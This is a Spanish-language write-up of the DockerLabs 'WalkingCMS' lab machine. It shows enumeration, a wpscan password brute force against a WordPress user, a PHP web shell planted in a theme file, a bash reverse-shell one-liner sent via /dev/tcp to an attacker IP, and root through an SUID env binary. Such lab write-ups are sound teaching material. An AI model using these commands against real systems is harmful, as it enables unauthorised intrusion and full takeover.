# Máquina WalkingCMS

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada al puerto 80.

```shell
nmap -sCV -p80 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Vemos la versión de Apache, un título, pero poca información relevante. Accedemos a la web para seguir inspeccionando:

![Pasted image 20240412122449](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/a7fdac50-3ccd-43ab-9f48-48a8d310cd7b)


Se trata de la web por defecto de Apache, por lo que procederemos a realizar **fuzzing** para descubrir directorios y posibles archivos:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
________________________________________________
/icons/               (Status: 403) [Size: 275]
/wordpress/           (Status: 200) [Size: 52441]
/server-status/       (Status: 403) [Size: 275]  
```

Encontramos un directorio **wordpress**. Accedemos.

![Pasted image 20240412122740](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/556bf2c2-e6de-46d5-9bda-0c4fcebb7014)

Como efectivamente se trata de **WordPress**, utilizaremos la herramienta **wpscan** para enumerarla, para intentar encontrar posibles usuarios, directorios, plugins vulnerables, etc.

```shell
wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp
________________________________________________
[i] User(s) Identified:

[+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

La información más importante que obtenemos del escaneo es un usuario -> **mario**
Lo aprovechamos para realizar un ataque de **fuerza bruta** usando otra vez **wpscan** y el famoso diccionario de contraseñas **rockyou**.

```shell
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
________________________________________________
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love                                                                                                                                                                                                                                
Trying mario / badboy Time: 00:00:01 <                                                                                                                                                                          > (390 / 14344782)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mario, Password: love
```

El ataque de fuerza bruta da resultado y obtenemos la contraseña de **mario** -> **love**
Trataremos de encontrar el panel de login donde le podamos dar uso a estas credenciales usando de nuevo **gobuster**. En este caso haremos un escaneo por directorios y por archivos con extensiones como php o html.

```shell
gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html
________________________________________________
/wp-content           (Status: 301) [Size: 323] [--> http://172.17.0.2/wordpress/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/wordpress/]             
/wp-login.php         (Status: 200) [Size: 6580]                                             
/license.txt          (Status: 200) [Size: 19915]                                            
/wp-includes          (Status: 301) [Size: 324] [--> http://172.17.0.2/wordpress/wp-includes/]
/readme.html          (Status: 200) [Size: 7401]                                              
/wp-trackback.php     (Status: 200) [Size: 136]                                               
/wp-admin             (Status: 301) [Size: 321] [--> http://172.17.0.2/wordpress/wp-admin/]   
/xmlrpc.php           (Status: 405) [Size: 42]                                                
/wp-signup.php        (Status: 302) [Size: 0] [--> http://172.17.0.2/wordpress/wp-login.php?action=register]
```

Accedemos en la web al directorio **/wp-admin**:

![Pasted image 20240412123821](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/9f71fbb1-ac16-4fb2-a8df-cb29a1d3ea20)

---------------
##  Explotación

Probamos las credenciales en el panel de login:
Logramos acceder como el usuario mario que es **administrador**.
Una vez dentro con sesión de administrador, una forma de lograr ejecución remota de comandos sobre la máquina -> (**RCE**), es editar alguno de los temas, en este caso se está usando el Twenty Twenty-Two en la página principal. Nos dirigimos a alguno de los recursos que tiene y editaremos por ejemplo el **index.php**

![Pasted image 20240412125523](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/a489b0b4-5d3b-4980-89ff-93082e6b53f3)

Borraremos este código y pondremos el nuestro propio, que al ser interpretado nos permita enviar valores con los comandos que queremos ejecutar a través del método **GET**, y a través del parámetro **cmd**:

```php
<?php
	system($_GET['cmd']);
?>
```

Nos dirigimos a la ruta donde podremos encontrar los **temas** por defecto en wordpress, dentro de la ruta de nuestro tema que es el Twenty Twenty-Two hemos modificado el index.php. Así que cargamos la siguiente URL pasándole un valor al parámetro **cmd** que hemos definido:

```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=id
```

Comprobamos que se ejecuta de forma correcta y hemos logrado el **RCE**.

![Pasted image 20240412125845](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/f15be9cf-af40-4e2c-88e8-20904b54d17e)

A continuación nos enviamos la **Reverse shell** a nuestra máquina atacante, poniéndonos antes en escucha por el puerto 443 con netcat:

```shell
nc -nlvp 443
```

(Es posible que para escuchar con netcat por el puerto 443 necesites ser el usuario root)

```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.39/443 0>%261"
```

Los **"%26"** corresponden al símbolo **"&"** de forma URL-encodeada para que no den conflicto.

Hemos ganado acceso a la máquina:

![Pasted image 20240412135523](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/3552ef3d-715a-41d9-a846-bc970b5c94a8)

------------
### Tratamiento de la tty

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

-----------------
## Escalada de privilegios

En el /etc/passwd no encontramos ningún usuario **mario** al que podamos migrar con las credenciales que ya tenemos. Tampoco podemos hacer **"sudo -l**.
Buscaremos por binarios con permisos **SUID** desde la raíz:

```shell 
find / -perm -4000 2>/dev/null
________________________________________________
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/env
```

Nos llama la atención el binario **/usr/bin/env**.
Si no sabemos como explotarlo (o si no sabemos si es posible abusar de él para escalar privilegios), podemos recurrir a [GTFOBins](https://gtfobins.github.io/) , y si es crítico esta página nos indicará como podemos explotarlo. En este caso es sencillo ya que con env podemos lanzarnos directamente una consola, y al ser ejecutado como el root gracias al permiso **SUID**, esta consola será lanzada con sus permisos, de forma que hemos logrado el nivel de privilegios máximo sobre la máquina !

```bash
./usr/bin/env /bin/sh -p
________________________________________________
whoami
root
```

